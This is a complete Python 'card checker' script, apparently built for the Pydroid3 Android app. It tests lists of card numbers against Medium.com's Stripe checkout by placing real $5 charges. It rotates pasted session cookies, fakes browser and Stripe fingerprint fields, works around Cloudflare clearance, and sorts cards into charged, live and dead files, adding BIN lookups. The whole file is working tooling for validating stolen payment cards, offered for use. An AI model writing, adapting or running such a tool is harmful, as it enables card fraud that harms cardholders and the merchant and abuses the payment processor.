"""
Medium.com Card Checker for Pydroid3
Full $5 Charge Gate with Multiple Cookie Rotation
"""

import requests
import random
import string
import uuid
import time
import os
import re
import json

# ============ CONFIGURATION ============
INPUT_FILE = "cards.txt"
COOKIE_FILE = "cookies.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3
DEBUG = True  # Set to True to see debug info
# =======================================

def log(msg):
    if DEBUG:
        print(f"[DEBUG] {msg}")

def generate_guid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_muid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_sid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def get_bin_info(cc):
    try:
        bin_code = cc[:6]
        r = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=10)
        if r.status_code == 200:
            data = r.json()
            vendor = data.get('scheme', 'Unknown').upper()
            card_type = data.get('type', 'Unknown').upper()
            level = data.get('brand', 'Unknown').upper()
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '')
            return f"{vendor} - {card_type} - {level} | {bank} | {country} {flag}"
    except:
        pass
    return f"BIN: {cc[:6]}"

def extract_cookies_from_block(block):
    cookies = {}
    pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]*)['\"]"
    matches = re.findall(pattern, block)
    
    for key, value in matches:
        if key not in ['authority', 'accept', 'accept-language', 'content-type', 
                       'origin', 'referer', 'user-agent', 'sec-ch-ua', 'sec-ch-ua-mobile',
                       'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 
                       'sec-fetch-site', 'apollographql-client-name', 'apollographql-client-version',
                       'graphql-operation', 'medium-frontend-app', 'medium-frontend-path',
                       'medium-frontend-route', 'operationName', 'query', 'payload']:
            cookies[key] = value
    
    return cookies

def load_all_cookies():
    if not os.path.exists(COOKIE_FILE):
        return []
    
    with open(COOKIE_FILE, 'r') as f:
        content = f.read()
    
    cookie_sets = []
    cookie_block_pattern = r'cookies\s*=\s*\{([^}]+)\}'
    matches = re.findall(cookie_block_pattern, content, re.DOTALL)
    
    for match in matches:
        block = '{' + match + '}'
        cookies = extract_cookies_from_block(block)
        if cookies and 'uid' in cookies and 'sid' in cookies:
            cookie_sets.append(cookies)
    
    seen = set()
    unique_sets = []
    for cookies in cookie_sets:
        key = cookies.get('uid', '') + cookies.get('sid', '')
        if key and key not in seen:
            seen.add(key)
            unique_sets.append(cookies)
    
    return unique_sets

def get_payment_intent_from_page(cookies):
    """Get payment intent by visiting the confirmation page"""
    
    # Build cookie string
    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    
    headers = {
        'authority': 'medium.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookie_str,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        log("Fetching plans page...")
        r = requests.get('https://medium.com/plans', headers=headers, timeout=30)
        log(f"Plans page status: {r.status_code}")
        
        log("Fetching confirmation page...")
        r = requests.get('https://medium.com/plans/confirmation/monthly', headers=headers, timeout=30)
        log(f"Confirmation page status: {r.status_code}")
        html = r.text
        
        # Check for Cloudflare block
        if 'Just a moment' in html or 'cf-browser-verification' in html:
            log("Cloudflare block detected!")
            return None, None, "Cloudflare blocked - update cf_clearance cookie"
        
        # Try to find client secret
        patterns = [
            r'(pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)',
            r'(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)',
            r'"clientSecret"\s*:\s*"([^"]+)"',
            r'clientSecret["\s:]+([pi_|seti_][^"&\s]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                client_secret = match.group(1)
                intent_id = client_secret.split('_secret_')[0]
                log(f"Found intent: {intent_id}")
                return intent_id, client_secret, None
        
        # Check if logged in
        if 'Sign in' in html or 'sign-in' in html.lower():
            return None, None, "Not logged in - check cookies"
        
        log(f"Page length: {len(html)}")
        return None, None, "No payment intent found in page"
        
    except Exception as e:
        log(f"Exception: {e}")
        return None, None, str(e)

def create_payment_method(cc, mes, ano, cvv):
    """Create Stripe payment method"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    guid = generate_guid()
    muid = generate_muid()
    sid = generate_sid()
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(random.randint(30000, 60000)),
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def confirm_payment_intent(pm_id, pi_id, client_secret):
    """Confirm payment intent"""
    
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'return_url': 'https://medium.com/welcome-member',
        'payment_method': pm_id,
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'l1',
        'client_secret': client_secret,
    }
    
    # Choose endpoint based on intent type
    if pi_id.startswith('seti_'):
        url = f'https://api.stripe.com/v1/setup_intents/{pi_id}/confirm'
    else:
        url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
    
    try:
        r = requests.post(url, headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def parse_response(response):
    """Parse Stripe response"""
    
    if 'error' in response:
        error = response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', '')
        
        ccn_codes = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect_zip', 'insufficient_funds',
            'card_velocity_exceeded', 'do_not_honor', 'generic_decline', 'lost_card',
            'stolen_card', 'pickup_card', 'restricted_card', 'security_violation',
            'service_not_allowed', 'transaction_not_allowed', 'try_again_later',
            'withdrawal_count_limit_exceeded', 'expired_card'
        ]
        
        if 'authentication' in message.lower() or code == 'authentication_required':
            return 'CCN', '3DS Required'
        
        if code in ccn_codes or decline_code in ccn_codes:
            return 'CCN', f"{decline_code or code}"
        
        if 'rate_limit' in code:
            return 'RATE_LIMIT', message
        
        return 'DECLINED', f"{decline_code or code or message}"
    
    status = response.get('status', '')
    
    if status == 'succeeded':
        return 'CHARGED', 'Payment Successful!'
    elif status == 'requires_action':
        return 'CCN', '3DS Required'
    elif status in ['processing']:
        return 'CHARGED', 'Processing'
    
    return 'DECLINED', f"Status: {status}"

def check_card(cookies, cc, mes, ano, cvv):
    """Check a single card"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    # Step 1: Get payment intent
    log("Getting payment intent...")
    intent_id, client_secret, error = get_payment_intent_from_page(cookies)
    
    if not intent_id:
        return 'ERROR', f"PI: {error}"
    
    log(f"Got intent: {intent_id[:20]}...")
    
    # Step 2: Create payment method
    log("Creating payment method...")
    pm_response = create_payment_method(cc, mes, ano, cvv)
    
    if 'error' in pm_response:
        error = pm_response['error']
        code = error.get('code', '')
        message = error.get('message', '')
        
        if code in ['incorrect_cvc', 'invalid_cvc', 'expired_card']:
            return 'CCN', code
        
        return 'DECLINED', f"{code or message}"
    
    pm_id = pm_response.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    log(f"PM created: {pm_id}")
    
    # Step 3: Confirm payment
    log("Confirming payment...")
    confirm_response = confirm_payment_intent(pm_id, intent_id, client_secret)
    
    return parse_response(confirm_response)

def save_result(card, status, message):
    if status in ['CHARGED', 'CCN']:
        with open(LIVE_FILE, 'a') as f:
            f.write(f"{card} | {message}\n")
    else:
        with open(DEAD_FILE, 'a') as f:
            f.write(f"{card} | {message}\n")

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      MEDIUM.COM CARD CHECKER          ║
    ║         FOR PYDROID3 v3.0             ║
    ║   $5 CHARGE - MULTI COOKIE ROTATION   ║
    ╚═══════════════════════════════════════╝
    """)
    
    all_cookies = load_all_cookies()
    
    if not all_cookies:
        print(f"[!] No cookies found in {COOKIE_FILE}!")
        with open(COOKIE_FILE, 'w') as f:
            f.write("# Paste cookies = { } blocks here\n")
        return
    
    print(f"[+] Loaded {len(all_cookies)} cookie set(s)")
    for i, cookies in enumerate(all_cookies, 1):
        uid = cookies.get('uid', 'N/A')[:10]
        cf = 'Yes' if cookies.get('cf_clearance') else 'No'
        print(f"    [{i}] uid: {uid}... | cf_clearance: {cf}")
    
    # Check for cf_clearance
    if not all_cookies[0].get('cf_clearance'):
        print("\n[!] WARNING: cf_clearance cookie missing!")
        print("[!] You need to include ALL cookies including cf_clearance")
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        lines = f.readlines()
    
    cards = [l.strip() for l in lines if l.strip() and not l.startswith('#') and '|' in l]
    
    if not cards:
        print("[!] No cards in cards.txt")
        return
    
    print(f"\n[*] Cards: {len(cards)}")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 50)
    
    stats = {'charged': 0, 'ccn': 0, 'dead': 0, 'error': 0}
    cookie_idx = 0
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        if len(parts) < 4:
            continue
            
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        cookies = all_cookies[cookie_idx]
        uid = cookies.get('uid', '')[:8]
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]} [Cookie: {uid}]")
        
        start = time.time()
        status, message = check_card(cookies, cc, mes, ano, cvv)
        elapsed = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {fullcc}")
            print(f"[+] {message}")
            print(f"[+] {get_bin_info(cc)}")
            stats['charged'] += 1
            save_result(fullcc, status, message)
        elif status == 'CCN':
            print(f"[CCN] {fullcc}")
            print(f"[+] {message}")
            print(f"[+] {get_bin_info(cc)}")
            stats['ccn'] += 1
            save_result(fullcc, status, message)
        elif status == 'ERROR':
            print(f"[ERROR] {message}")
            stats['error'] += 1
        else:
            print(f"[DEAD] {fullcc}")
            print(f"[-] {message}")
            stats['dead'] += 1
            save_result(fullcc, status, message)
        
        print(f"[*] {elapsed}s")
        
        cookie_idx = (cookie_idx + 1) % len(all_cookies)
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 50)
    print("SUMMARY")
    print("=" * 50)
    print(f"Charged: {stats['charged']}")
    print(f"CCN:     {stats['ccn']}")
    print(f"Dead:    {stats['dead']}")
    print(f"Errors:  {stats['error']}")

if __name__ == "__main__":
    main()
